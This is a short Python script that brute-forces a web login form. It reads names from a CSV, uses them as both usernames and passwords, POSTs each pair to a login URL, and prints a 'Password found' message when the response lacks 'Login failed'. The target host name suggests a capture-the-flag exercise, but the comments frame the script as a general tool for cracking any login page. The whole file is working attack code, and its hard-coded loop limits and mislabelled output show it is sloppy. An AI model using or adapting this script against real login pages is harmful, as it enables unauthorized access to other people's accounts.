import requests
import pandas as pd

lis=pd.read_csv("list.csv")
l=lis["name"].values

# define the webpage you want to crack

# this page must be a login page with a username and password

url = "https://h22-ctf-kr2i71j106.zohosecurity.team/login"

# let's get the username

user= l

# next, let's get the password file

password=l

# 
for i in range(1):
    for j in range(2):

# let's strip it of any \n

        password[j] = password[j].strip("\n")

# collect the data needed from "inspect element"

        data = {'username':user[i], 'password':password[j], "Login":'submit'}

        send_data_url = requests.post(url, data=data)
        print(str(send_data_url.content))
        if "Login failed" in str(send_data_url.content):
            print("[*] Attempting user: %s" % user[i])

            print("[*] Attempting password: %s" % password[j])

        else:
            print("[!] Password found: %s " % user[i])

            print("[!] Password found: %s " % password[j])